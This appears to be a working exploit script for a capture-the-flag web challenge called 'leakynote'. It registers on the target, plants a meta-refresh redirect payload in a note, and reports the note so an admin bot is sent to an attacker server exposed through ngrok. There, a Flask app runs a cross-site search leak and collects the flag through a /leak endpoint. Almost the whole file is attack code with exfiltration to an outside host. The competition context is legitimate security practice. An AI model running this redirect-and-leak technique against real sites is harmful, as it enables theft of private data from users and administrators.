import os
import secrets

from flask import Flask, send_file, render_template, request
from pyngrok import conf,ngrok
import requests



tunnels = ngrok.get_tunnels()
for tunnel in tunnels:
    print(tunnel.public_url)
    ngrok.disconnect(tunnel.public_url)

ngrok.set_auth_token("<TOKEN>")
http_tunnel = ngrok.connect(5000, "http")
print("URL", http_tunnel.public_url)


class Challenge:

    def __init__(self, url) -> None:
        self.url = url
        self.session = requests.Session()
    
    def _(self, path):
        return self.url + path
    
    def register(self):
        a = self.session.post(self._("/register.php"), data={
            "name": secrets.token_hex(16),
            "pass": secrets.token_hex(16)
        })
        
        assert a.ok

    def load_exploit(self):
        #payload is meta redirect
        payload = """<meta http-equiv="refresh" content="0; url={}">""".format(http_tunnel.public_url)

        a = self.session.post(self._("/index.php"), data={
            'title': secrets.token_hex(16),
            'contents': payload
        }, allow_redirects=False)
        post_id = a.text.split("<li><a href='/post.php?id=")[1].split("'>")[0]
        a = self.session.post(self._('/report.php'), data={
            'post_id': post_id
        })

'''

1. Send bot to attaccker controlled server
2. Open all links like
    2.1 /search.php?query={guess}{try}
3. Check all links and get the visited one
4. Profit
'''
URL = os.environ.get("URL", "http://leakynote.challs.teamitaly.eu:1337")

app = Flask(__name__)
own_pid = os.getpid()

@app.route('/')
def index():
    return render_template('exploit.html', CHALLENGE_URL=URL)

@app.route('/poc')
def poc():
    args = request.args.get('url')
    return render_template('poc.html', url=args,CHALLENGE_URL=URL)

@app.route('/leak')
def leak():
    global own_pid
    flag = request.args.get('flag')
    if flag[-1] == '}':
        print(flag)
        os.kill(own_pid, 9) 
    return ""

# SEND THE EXPLPOIT TO THE BOT
c = Challenge(URL)
c.register()
c.load_exploit()


app.run(host='0.0.0.0')